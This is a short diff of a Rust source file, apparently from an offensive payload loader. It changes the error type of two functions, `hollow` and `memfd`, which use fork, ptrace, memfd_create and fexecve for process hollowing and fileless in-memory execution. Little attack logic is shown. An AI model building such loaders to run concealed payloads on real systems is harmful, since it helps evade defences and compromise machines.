@@ -1,17 +1,17 @@
 use std::ffi::{c_void, CString};
 use std::os::fd::AsRawFd;
 
-use nix::errno::Errno;
 use nix::sys::memfd::{memfd_create, MemFdCreateFlag};
 use nix::sys::ptrace;
 use nix::sys::wait::waitpid;
 use nix::unistd::{self, execve, fexecve, fork, ForkResult};
 
 use crate::elf::create_elf;
+use crate::error::Result;
 use crate::utils::{get_env, str_to_vec_c_string};
 use crate::{Payload, PayloadType};
 
-pub fn hollow(payload: Payload) -> Result<(), Errno> {
+pub fn hollow(payload: Payload) -> Result<()> {
     match unsafe { fork() } {
         Ok(ForkResult::Parent { child, .. }) => {
             waitpid(child, None)?;
@@ -55,7 +55,7 @@ pub fn hollow(payload: Payload) -> Result<(), Errno> {
     Ok(())
 }
 
-pub fn memfd(payload: Payload) -> Result<(), Errno> {
+pub fn memfd(payload: Payload) -> Result<()> {
     let anon_file_name = CString::new("").unwrap();
     let p_file_name = anon_file_name.as_c_str();
 
